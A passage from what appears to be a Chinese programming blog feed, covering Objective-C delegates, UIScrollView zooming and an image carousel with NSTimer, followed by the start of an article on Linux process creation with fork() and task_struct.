<p><strong>协议中的内容一般都是方法列表，当然也可以定义属性，协议是公共的定义，如果只是某个类使用，我们常做的就是写在某个类中。如果是多个类都是用同一个协议，建议创建一个Protocol文件，在这个文件中定义协议。遵循的协议可以被继承，协议只能定义公用的一套接口，类似于一个约束代理双方的作用。但不能提供具体的实现方法，实现方法需要代理对象去实现。协议可以继承其他协议，并且可以继承多个协议，在iOS中对象是不支持多继承的，而协议可以多继承。</strong></p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/6234F898-5C33-4E75-8056-84BB36E12A6A.png" alt="6234F898-5C33-4E75-8056-84BB36E12A6A" title="" class="">
                <p>6234F898-5C33-4E75-8056-84BB36E12A6A</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">//doublehui.h</div><div class="line">#import &lt;UIKit/UIKit.h&gt;</div><div class="line"></div><div class="line">#warning 1. 指定协议及代理方法，当前协议继承了一个协议，所以只继承了来自这一个协议的方法列表</div><div class="line">@protocol DoubleHuiDelegate &lt;NSObject&gt;</div><div class="line"></div><div class="line">- (void)needPigMeet;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@interface DoubleHui : UIView</div><div class="line"></div><div class="line">#warning 2. 创建一个代理属性</div><div class="line">@property (nonatomic, weak) id&lt;DoubleHuiDelegate&gt; delegate;</div><div class="line"></div><div class="line">@end</div><div class="line">//doublehui.m </div><div class="line">#import &quot;DoubleHui.h&quot;</div><div class="line"></div><div class="line">@implementation DoubleHui</div><div class="line"></div><div class="line">- (instancetype)initWithFrame:(CGRect)frame &#123;</div><div class="line">    if (self = [super initWithFrame:frame]) &#123;</div><div class="line">        </div><div class="line">        UIButton *button = [[UIButton alloc] initWithFrame:CGRectMake(0, 0, 50, 50)];</div><div class="line">        [button setBackgroundColor:[UIColor redColor]];</div><div class="line">        </div><div class="line">        // 监听方法</div><div class="line">        [button addTarget:self</div><div class="line">                   action:@selector(clickButton)</div><div class="line">         forControlEvents:UIControlEventTouchUpInside];</div><div class="line">        </div><div class="line">        [self addSubview:button];</div><div class="line">    &#125;</div><div class="line">    return self;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)clickButton &#123;</div><div class="line">    // 点击按钮的时候就表示， 缺肉了</div><div class="line">    NSLog(@&quot;缺猪肉， 赶紧送&quot;);    </div><div class="line">    // 通知代理， 调用代理方法</div><div class="line">    //[self.delegate needPigMeet];</div><div class="line">    // respondsToSelector:@selector 返回一个bool ，如果该对象实现了这个方法， 就返回yes ，如果没有返回NO</div><div class="line">    </div><div class="line">    #warning 3. 调用代理方法</div><div class="line">    if ([self.delegate respondsToSelector:@selector(needPigMeet)]) &#123;</div><div class="line">        [self.delegate needPigMeet];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">@end</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">//ViewController.m</div><div class="line">#warning  1. 遵守协议</div><div class="line">@interface ViewController ()&lt;DoubleHuiDelegate&gt;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@implementation ViewController</div><div class="line"></div><div class="line">- (void)viewDidLoad &#123;</div><div class="line">    [super viewDidLoad];</div><div class="line">    </div><div class="line">    DoubleHui *huiView = [[DoubleHui alloc] initWithFrame:CGRectMake(100, 100, 100, 100)];</div><div class="line">    </div><div class="line">    [huiView setBackgroundColor:[UIColor orangeColor]];</div><div class="line">     // 设置代理</div><div class="line">    #warning  2. 设置代理，赋值回去</div><div class="line">    huiView.delegate = self;</div><div class="line">    </div><div class="line">    </div><div class="line">    [self.view addSubview:huiView];</div><div class="line">&#125;</div><div class="line"></div><div class="line">#warning  3. 实现代理方法</div><div class="line">-(void)needPigMeet &#123;</div><div class="line">    NSLog(@&quot;肉来了&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure>
<p>代理使用的原理：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/44EFD2BE-DB86-4B5D-9F7E-51485E8D816B.png" alt="44EFD2BE-DB86-4B5D-9F7E-51485E8D816B" title="" class="">
                <p>44EFD2BE-DB86-4B5D-9F7E-51485E8D816B</p>
            </figure></p>
<p>我对于代理的形象化理解：</p>
<p>小明要上厕所，告诉老师，老师同意，小明去上厕所，这个事件中，小明作为委托方，上厕所的方法在小明的身上，但是老师如果不同意，小明就无法上厕所，当老师同意的时候，小明才会调用自身的上厕所这个方法。</p>
<h2 id="4-监听ScrollView的滚动"><a href="#4-监听ScrollView的滚动" class="headerlink" title="4.监听ScrollView的滚动"></a>4.监听ScrollView的滚动</h2><p>可以使用拖拽的方式让scrollView和ViewController关联，然后设置代理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#import &quot;ViewController.h&quot;</div><div class="line"></div><div class="line">@interface ViewController ()&lt;UIScrollViewDelegate&gt;</div><div class="line">@property (weak, nonatomic) IBOutlet UIScrollView *scrollView;</div><div class="line">@property (weak, nonatomic) IBOutlet UIImageView *imageView;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@implementation ViewController</div><div class="line"></div><div class="line">- (void)viewDidLoad &#123;</div><div class="line">    [super viewDidLoad];</div><div class="line">    _scrollView.contentSize = _imageView.frame.size;</div><div class="line">    </div><div class="line">&#125;</div><div class="line">//当scrollView滚动的时候就会调用</div><div class="line">- (void)scrollViewDidScroll:(UIScrollView *)scrollView&#123;</div><div class="line">    NSLog(@&quot;滚动时调用&quot;);</div><div class="line">&#125;</div><div class="line">//开始拖拽的时候调用</div><div class="line">- (void)scrollViewWillBeginDragging:(UIScrollView *)scrollView&#123;</div><div class="line">    NSLog(@&quot;开始拖拽&quot;);</div><div class="line">&#125;</div><div class="line">//停止拖拽的时候调用</div><div class="line">- (void)scrollViewDidEndDragging:(UIScrollView *)scrollView willDecelerate:(BOOL)decelerate&#123;</div><div class="line">    NSLog(@&quot;停止拖拽&quot;);</div><div class="line">&#125;</div><div class="line">@end</div></pre></td></tr></table></figure>
<p>scrollView代理的使用：</p>
<blockquote>
<p>遵守协议</p>
<p>设置成为代理</p>
<p>实现对应的方法</p>
</blockquote>
<h2 id="5-实现图片的缩放"><a href="#5-实现图片的缩放" class="headerlink" title="5.实现图片的缩放"></a>5.实现图片的缩放</h2><p>放大缩小倍数属性：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">_scrollView.minimumZoomScale  最大的缩小倍数</div><div class="line"></div><div class="line">_scrollView.maximumZoomScale  最大的放大倍数</div></pre></td></tr></table></figure>
<p>同时需要设置代理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#import &quot;ViewController.h&quot;</div><div class="line"></div><div class="line">@interface ViewController ()&lt;UIScrollViewDelegate&gt;</div><div class="line">@property (weak, nonatomic) IBOutlet UIScrollView *scrollView;</div><div class="line">@property (weak, nonatomic) IBOutlet UIImageView *imageView;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@implementation ViewController</div><div class="line"></div><div class="line">- (void)viewDidLoad &#123;</div><div class="line">    [super viewDidLoad];</div><div class="line">    _scrollView.contentSize = _imageView.frame.size;</div><div class="line">    _scrollView.maximumZoomScale = 3;</div><div class="line">    _scrollView.minimumZoomScale = 0.3;</div><div class="line">    //设置成为代理,如果没有设置代理属性则不会调用代理方法</div><div class="line">    _scrollView.delegate = self;</div><div class="line">    </div><div class="line">&#125;</div><div class="line">//实现代理，告诉scrollView哪个图片需要被拉伸或者缩放</div><div class="line">-(UIView *)viewForZoomingInScrollView:(UIScrollView *)scrollView&#123;</div><div class="line">    return _imageView;</div><div class="line">&#125;</div><div class="line">//只有图片在放大或者缩小的过程中调用</div><div class="line">- (void)scrollViewDidZoom:(UIScrollView *)scrollView&#123;</div><div class="line">    NSLog(@&quot;Zooming&quot;);</div><div class="line">&#125;</div><div class="line">//在开始放大或缩小图片的时候调用</div><div class="line">- (void)scrollViewWillBeginZooming:(UIScrollView *)scrollView withView:(UIView *)view&#123;</div><div class="line">    NSLog(@&quot;begin zooming&quot;);</div><div class="line">&#125;</div><div class="line">//在结束放大或者缩小图片的时候调用</div><div class="line">- (void)scrollViewDidEndZooming:(UIScrollView *)scrollView withView:(UIView *)view atScale:(CGFloat)scale&#123;</div><div class="line">    NSLog(@&quot;end zooming&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="6-图片轮播器"><a href="#6-图片轮播器" class="headerlink" title="6.图片轮播器"></a>6.图片轮播器</h2><p>图片的设置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#define kImageCount 5</div><div class="line">- (void)setupScrollView &#123;</div><div class="line">    // 取出scrollView的size</div><div class="line">    CGSize scrollViewSize = _scrollView.frame.size;</div><div class="line">    </div><div class="line">    for (int i = 0; i &lt; kImageCount; i++) &#123;</div><div class="line">        // 计算imageView的x值</div><div class="line">        CGFloat imageViewX = i * scrollViewSize.width;</div><div class="line">        </div><div class="line">        UIImageView *imageView = [[UIImageView alloc] initWithFrame:CGRectMake(imageViewX, 0, scrollViewSize.width, scrollViewSize.height)];</div><div class="line">        </div><div class="line">        // 设置图片</div><div class="line">//        imageView.image =[UIImage imageNamed:@&quot;img_01&quot;];</div><div class="line">        // 拼接图片的名称</div><div class="line">        NSString *imageName = [NSString stringWithFormat:@&quot;img_%02d&quot;,i + 1];</div><div class="line">        </div><div class="line">        imageView.image = [UIImage imageNamed:imageName];</div><div class="line">        </div><div class="line">        // 添加到scrollView</div><div class="line">        [_scrollView addSubview:imageView];</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    // 设置 scrollView的contentSize</div><div class="line">    _scrollView.contentSize = CGSizeMake(kImageCount * scrollViewSize.width, 0);</div><div class="line">    </div><div class="line">    // 隐藏滚动指示器</div><div class="line">    _scrollView.showsHorizontalScrollIndicator = NO;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>设置分页的模式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//开启分页效果，根据scrollView的宽度进行分页</div><div class="line">_scrollView.pagingEnabled = YES;</div></pre></td></tr></table></figure>
<p>pageControll设置,拖动一个pageControll按钮到main.storyboard中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">- (void)setupPageControll &#123;</div><div class="line">  //根据具体图片的数量来修改</div><div class="line">  _pageControl.numberOfPages = kImageCount;</div><div class="line">     </div><div class="line">    // 设置指示器的颜色</div><div class="line">    // 非当前的指示器</div><div class="line">  _pageControl.pageIndicatorTintColor = [UIColor grayColor];</div><div class="line">// 设置当前指示器的颜色</div><div class="line">  _pageControl.currentPageIndicatorTintColor = [UIColor redColor];</div><div class="line">// 设置当前在第几个点,默认为0，如果超出范围则在最后一个显示</div><div class="line">  _pageControl.currentPage = 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> 将pageControl和scrollView进行关联</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/4809ED67-267E-490E-B679-69AB2C3A8884.png" alt="4809ED67-267E-490E-B679-69AB2C3A8884" title="" class="">
                <p>4809ED67-267E-490E-B679-69AB2C3A8884</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">//拖动图片的时候移动pageControl</div><div class="line">#define kScrollViewSize (_scrollView.frame.size)</div><div class="line">#pragma mark -  当scrollView停止减速的时候调用</div><div class="line">// Decelerating 减速</div><div class="line">- (void)scrollViewDidEndDecelerating:(UIScrollView *)scrollView &#123;</div><div class="line">    // currentPage = scrollView.contentOffset.x / kScrollViewSize.width</div><div class="line">    </div><div class="line">    _pageControl.currentPage = scrollView.contentOffset.x / kScrollViewSize.width;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>点击按钮实现滚动的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">- (IBAction)didClickButton &#123;</div><div class="line">  CGPoint offset = _scrollView.contentOffset;</div><div class="line">  NSInteger currentPage = _pageControl.currentPage;</div><div class="line">  if (currentPage == 4)&#123;</div><div class="line">    currentPage = 0;</div><div class="line">    offset.x = 0;   //或者写为offset = CGPointZero;</div><div class="line">  &#125;else&#123;</div><div class="line">  currentPage += 1;</div><div class="line">  offset.x += kScrollViewSize.width;</div><div class="line">  &#125;</div><div class="line">  _pageControl.currentPage = currentPage;</div><div class="line">  [_scrollView setContentOffset:offset animated:YES];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>通过定时器的实现自动滚动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">  - (void)initImageTimer &#123;</div><div class="line">    /**</div><div class="line">     scheduled 计划，安排</div><div class="line">     interval : 间隔</div><div class="line">     target :  一般指控制器</div><div class="line">     selector: 方法</div><div class="line">     userInfo : 用户自定义的参数</div><div class="line">     repeats: 重复</div><div class="line">     </div><div class="line">     每隔1秒钟 调用 控制器的  didClickButton： 方法， 传递的参数为nil</div><div class="line">     </div><div class="line">     一旦创建就会立即生效</div><div class="line">     </div><div class="line">     在使用timer的时候， 如果调用了 invalidate方法， 那么这个计时器就不会再次生效</div><div class="line">     重新创建新的timer</div><div class="line">     */</div><div class="line">    _timer = [NSTimer scheduledTimerWithTimeInterval:2</div><div class="line">                                              target:self</div><div class="line">                                            selector:@selector(didClickButton:)</div><div class="line">                                            userInfo:nil</div><div class="line">                                             repeats:YES];</div><div class="line">    </div><div class="line">   // [_timer fire];  调用fire ， 这个计时器会立即执行， 不会等待 interval 设置的时间</div><div class="line">   // 设置优先级，使其优先级和UITextView相同，滚动UITextView的同时也执行定时器的方法</div><div class="line">    NSRunLoop *mainLoop = [NSRunLoop mainRunLoop];</div><div class="line">    </div><div class="line">    </div><div class="line">    [mainLoop addTimer:_timer forMode:NSRunLoopCommonModes];</div><div class="line">    </div><div class="line">&#125;</div><div class="line">/**</div><div class="line"> 在开始拖拽的时候， 把计时器停止</div><div class="line"> </div><div class="line"> invalidate 无效的意思</div><div class="line"> */</div><div class="line">- (void)scrollViewWillBeginDragging:(UIScrollView *)scrollView &#123;</div><div class="line">    // 让计时器无效</div><div class="line">    [_timer invalidate];</div><div class="line">&#125;</div><div class="line"></div><div class="line">/**</div><div class="line"> 当停止拖拽的时候， 让计时器开始工作</div><div class="line"> 手指离开scrollView的时候</div><div class="line"> */</div><div class="line">- (void)scrollViewDidEndDragging:(UIScrollView *)scrollView willDecelerate:(BOOL)decelerate &#123;</div><div class="line">   [_timer fire];</div><div class="line">    </div><div class="line">    [self initImageTimer];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>UITextView是可以滚动的文章控件，可以配合轮播器一起使用</p>
<p>补：<a href="http://www.superqq.com/blog/2016/05/05/ios-nsrunllop-nstimer/" target="_blank" rel="external">关于NSRunLoop和NSTimer的深入理解</a></p>
<p>NSRunLoop是消息机制的处理模式</p>
<p>NSRunLoop的作用在于有事情做的时候使的当前NSRunLoop的线程工作，没有事情做让当前NSRunLoop的线程休眠</p>
<p>NSTimer默认添加到当前NSRunLoop中，也可以手动制定添加到自己新建的NSRunLoop</p>
<ul>
<li>NSRunLoopCommonModes 这是一组可配置的通用模式。将input sources与该模式关联则同时也将input sources与该组中的其它模式进行了关联。</li>
<li>每次运行一个run loop，你指定（显式或隐式）run loop的运行模式。当相应的模式传递给run loop时，只有与该模式对应的input sources才被监控并允许run loop对事件进行处理（与此类似，也只有与该模式对应的observers才会被通知）</li>
</ul>
<h2 id="7-代理使用weak修饰"><a href="#7-代理使用weak修饰" class="headerlink" title="7.代理使用weak修饰"></a>7.代理使用weak修饰</h2><p>设置代理属性的时候，使用weak修饰符，是为了防止循环引用</p>
<p>addSubView方法其实是对加入的子控件有一个强引用，所以有两个对象互相饮用的时候，其中一个必须是weak，否则无法释放掉。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E4%BB%A3%E7%90%86%E7%9A%84weak%E4%BF%AE%E9%A5%B0%E7%AC%A6.png" alt="%E4%BB%A3%E7%90%86%E7%9A%84weak%E4%BF%AE%E9%A5%B0%E7%AC%A6" title="" class="">
                <p>%E4%BB%A3%E7%90%86%E7%9A%84weak%E4%BF%AE%E9%A5%B0%E7%AC%A6</p>
            </figure>
<h2 id="8-使用代理优化九宫格代码思路"><a href="#8-使用代理优化九宫格代码思路" class="headerlink" title="8.使用代理优化九宫格代码思路"></a>8.使用代理优化九宫格代码思路</h2><p>1.在yellowView.h里面创造一个代理的方法和代理的属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">- (void)yellowView:(YellowView *)yellowView  didClickButton:(AppModel *)model;</div></pre></td></tr></table></figure>
<p>2.在yellowView.m点击按钮的方法中中调用代理的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//在传递参数的时候，不管别人用不用，首先要把自己传递出去</div><div class="line">if([self.delegate respondsToSelector:@selector(yellowView:didClickButton:)])&#123;</div><div class="line"> [self.delegate yellowView:self didClickButton:_appModel]; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>3.在ViewController.m的ViewDidload中创建coverView,并在类扩展中创建一个coverView属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//在这之前在循环生成YellowView过程中把self赋值给代理属性</div><div class="line">UIView *coverView = [[UIView alloc]initWithFrame:CGRentMake:self.view.size.bounds];</div><div class="line">self.coverView = coverView;</div><div class="line">coverView.backgroundColor = [UIColor blackColor];</div><div class="line">coverView.alpha = 0;</div><div class="line">[self.view addSubView:coverView];</div></pre></td></tr></table></figure>
<p>4.在ViewController.m中构造代理方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">- (void)yellowView:(YellowView *)yellowView  didClickButton:(AppModel *)model&#123;</div><div class="line">  _coverView.alpha = 0.6;</div><div class="line">  _coverView.appModel = model;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 代理 图片轮播器 模块化 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux进程管理]]></title>
      <url>/2017/05/22/Linux%E8%BF%9B%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p>Linux进程的是如何一步步被常见出来的，他的底层结构到底是什么？他又是如何消亡在内存之中的，今天我们就来揭开这些谜团<br><a id="more"></a></p>
<h1 id="Linux进程"><a href="#Linux进程" class="headerlink" title="Linux进程"></a>Linux进程</h1><p>进程是Unix操作系统抽象概念中最基本的一种，因此进程管理就是所有操作系统的心脏所在，Linux也不意外</p>
<h2 id="进程："><a href="#进程：" class="headerlink" title="进程："></a>进程：</h2><p>就是处于执行期中的程序，但不仅仅局限在一段可执行的程序代码（Unix中称之为代码段），通常进程还要包括其他资源，进程还包括了打开的文件，挂起的信号，内核内部数据，处理器状态，一个或多个具有内存映射的内存地址空间，存放全局变量的数据段，一个或执行多个线程。</p>
<h2 id="线程："><a href="#线程：" class="headerlink" title="线程："></a>线程：</h2><p>执行线程，简称线程，是在进程中的活动对象。每个线程都有一个独立的程序计数器，进程栈和一组进程寄存器。内核调度的对象是线程而不是进程。传统的Unix系统中，一个进程只包含一个线程，现在的系统中包含多个线程的多线程程序司空见惯，而Linux中线程的实现比较特别，它对进程和线程并不特别区分，线程只不过是一种特殊的进程。</p>
<h2 id="1-进程的创建"><a href="#1-进程的创建" class="headerlink" title="1.进程的创建"></a>1.进程的创建</h2><p>在Linux系统中通常是通过<a href="http://blog.csdn.net/jason314/article/details/5640969" target="_blank" rel="external">fork()</a>系统调用复制一个现有的进程来创造一个全新的进程(现代Linux内核中，fork()实际上是有clone系统调用实现的，然后clone系统调用再去调用do_fork()。调用fork()的进程被称作父进程，产生的进程称作子进程。</p>
<p>子进程是父进程的<strong>副本</strong>，它将获得父进程数据空间、堆、栈等资源的副本。注意，子进程持有的是上述存储空间的<code>副本</code>，这意味着父子进程间<strong>不共享</strong>这些存储空间，<strong>子进程有了独立的地址空间</strong>。但是子进程并不是在<code>fork()</code>的时候就把父进程所有的资源都拷贝了一份而是采用一种叫做<code>写时拷贝</code>的技术，也就是说只有需要写入的时候，数据才会被复制，换而言之，资源复制只会在需要写入的时候进行，在这之前，只是以只读方式共享。这种技术使得地址空间上的页的拷贝被推迟到实际写入的时候进行，在页根本不会被写入的情况下他们就无需复制了。这种优化可以避免拷贝大量根本就不会被使用的数据，不需要复制的时候<code>fork()</code>的实际开销就是复制父进程的也表以及给子进程创建唯一的进程描述符。</p>
<p>在该调用结束的时候，在返回点这个相同的位置上，父进程恢复执行，子进程开始执行。fork()系统调用从内核中返回两次：一次回到父进程，另一次回到新产生的子进程。</p>
<p>创建子进程，fork()函数返回两个数值，若创建成功，子进程中返回0；父进程返回子进程ID。用资源空间图示如下：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/DACF16C2-9CA7-436A-B811-D6F36ACC4F1B.png" alt="DACF16C2-9CA7-436A-B811-D6F36ACC4F1B" title="" class="">
                <p>DACF16C2-9CA7-436A-B811-D6F36ACC4F1B</p>
            </figure>
<p>代码执行解释：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/82A0E7D9-73C9-4BB0-9BF9-161AD547FD56.png" alt="82A0E7D9-73C9-4BB0-9BF9-161AD547FD56" title="" class="">
                <p>82A0E7D9-73C9-4BB0-9BF9-161AD547FD56</p>
            </figure>
<p>由操作系统相关知识可知，<strong>进程是系统资源分配的基本单位，</strong>因此子进程与父进程不共享进程资源空间。在执行代码段第8行之前，系统中只有默认的主进程。在执行完代码段第8行后，系统中就有了两个进程，即主进程和由其创建的子进程。所以代码执行在打印的时候只有一个”Before the fork()…”，而有两个”After the fork()…”</p>
<p>执行了fork()函数后，主进程为父进程生成了一份资源空间的副本。主进程中的pid为子进程的pid(pid&gt;0)，子进程中的pid为0。</p>
<p>在fork()函数之后父进程与子进程都从下一行执行，即第9行。因为主进程中pid&gt;0，可以执行else if(pid&gt;0)段代码，子进程pid=0，可以执行else if(pid==0)段代码。</p>
<p> fork出错可能有两种原因：<br>​    1）当前的进程数已经达到了系统规定的上限，这时errno的值被设置为EAGAIN。<br>​    2）系统内存不足，这时errno的值被设置为ENOMEM。  </p>
<p>执行的结果：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Before the fork(), pid = 9715</div><div class="line">After the fork(), pid = 9715</div><div class="line">the parent process! 9715</div><div class="line">After the fork(), pid = 9716</div><div class="line">the chlid process! 9716</div></pre></td></tr></table></figure>
<p>具体的执行结果，可能会由于进程调度的不同，后面的四个输出顺序可能不同。不过第一个输出的一定是”Before the fork …”</p>
<p>最终，程序通过exit()系统调用退出执行。这个函数会终结进程并将其占用的资源给释放掉。父进程可以通过wait4()系统调用来查询子进程是否被终结，这其实使得进程拥有了等待特定进程执行完毕的能力。进程退出执行后被设置为僵死状态，直到它的父进程调用wait()或者waitpid()为止。</p>
<h2 id="2-进程描述符和任务结构"><a href="#2-进程描述符和任务结构" class="headerlink" title="2.进程描述符和任务结构"></a>2.进程描述符和任务结构</h2><h4 id="1-进程描述符"><a href="#1-进程描述符" class="headerlink" title="1.进程描述符"></a>1.进程描述符</h4><p>内核把进程的列表存放在叫做”任务队列”(task list)的双向循环链表中。链表中的每一项都是类型为task_struct，称为进程描述符的结构。进程描述符包含一个进程的所有信息。</p>
<p>task_struct中包含的数据能够完整的描述一个正在执行的程序：它打开的文件，进程的地址空间，进程的状态，挂起的信号等等</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/48840FF2-338D-4B87-A792-862B476EF114.png" alt="" title="" class="">
                <p></p>
            </figure>
<p>Linux通过slab分配器分配task_struct结构，这样可以达到对象复用和缓存着色的目的，由于slab分配器动态生成task_struct，所以只需要在栈底（对于向下生长的栈）或者栈顶（对于向上生长的栈）创建一个新的结构struct thread_info</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/132CC7AF-8C03-4506-A99E-B6C5AE0559E6.png" alt="132CC7AF-8C03-4506-A99E-B6C5AE0559E6" title="" class="">
                <p>132CC7AF-8C03-4506-A99E-B6C5AE0559E6</p>
            </figure>
<figure class="image-box">
